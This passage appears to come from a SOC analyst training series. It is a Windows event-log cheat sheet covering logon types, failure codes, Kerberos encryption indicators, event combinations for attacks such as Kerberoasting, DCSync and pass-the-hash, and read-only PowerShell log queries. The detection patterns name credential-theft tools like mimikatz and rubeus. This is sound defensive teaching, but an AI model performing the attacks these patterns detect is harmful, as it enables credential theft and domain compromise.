8  = NetworkCleartext            🚨 Password in clear
9  = NewCredentials (RunAs)      Lateral movement sign
10 = RemoteInteractive (RDP)     Monitor closely

FAILURE CODES FOR 4625:
─────────────────────────────────────────────────────────
0xC000006A = Wrong password      → Brute force / spray
0xC0000064 = User doesn't exist  → Enumeration
0xC000006D = Generic failure     → Password spray
0xC0000234 = Account locked      → Lockout triggered
0xC0000072 = Account disabled    → Old creds being used

KERBEROS ENCRYPTION TYPES (4769):
─────────────────────────────────────────────────────────
0x17 = RC4    → 🚨 Kerberoasting indicator
0x12 = AES256 → ✅ Normal and secure

CRITICAL EVENT ID COMBINATIONS:
─────────────────────────────────────────────────────────
Password Spray:    Many 4625 + diff accounts + same IP
Pass-the-Hash:     4624 + Type 3 + NTLM + Admin acct
Kerberoasting:     4769 + 0x17 encryption + service acct
DCSync:            4662 + replication GUIDs + non-DC IP
Backdoor Account:  4720 + 4728 (Domain Admins) in sequence
Covering Tracks:   4719 (audit policy changed)
Malware Persist:   4698 + base64 encoded command
Attack Tools:      4688 showing mimikatz/bloodhound/rubeus

NAVI'S MORNING TRIAGE ORDER:
─────────────────────────────────────────────────────────
1. Critical → DCSync (4662), Audit disabled (4719)
2. High     → Mass lockout (4740), Admin created (4720)
3. Medium   → Failed login spikes (4625), New RDP (4624)
4. Low      → Single failures, expected admin activity

INVESTIGATION FRAMEWORK — 5 QUESTIONS:
─────────────────────────────────────────────────────────
WHO   → Which account?
WHAT  → Which Event ID? What action?
WHERE → Which machine? Which IP?
HOW   → Logon type? Protocol? Tool used?
WHEN  → Time? Business hours? Pattern?

KEY POWERSHELL COMMANDS:
─────────────────────────────────────────────────────────
Failed logins:
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625}

Lockout source:
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4740}
→ Properties[1].Value = CallerMachine

RC4 Kerberos (Kerberoasting):
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769}
→ Properties[6].Value = EncryptionType → filter "0x17"

Group changes:
Get-WinEvent -FilterHashtable @{LogName='Security';
  Id=@(4728,4732,4756)}

LABS COMPLETED:
─────────────────────────────────────────────────────────
□ Ran Toolkit 1-5 commands on DC01
□ Simulated lockout + detected source machine
□ CyberDefenders: DetectiveAD
□ HTB Sherlock: Camp Fire 1
```

---

> 💡 **SOC Architect's Truth:** *"Junior analysts memorize Event IDs. Senior analysts understand the story behind the numbers. When you see 4625 x50, then 4624 with NTLM, then 4648, then 4728 — you're reading an attack unfolding in real time. That's not log analysis. That's detective work. Build this instinct now and every SOC interview question becomes a story you can tell."*

---

**Day 5 tomorrow — Hands-On Labs: BloodHound + Full Attack Simulation in your Azure lab.**

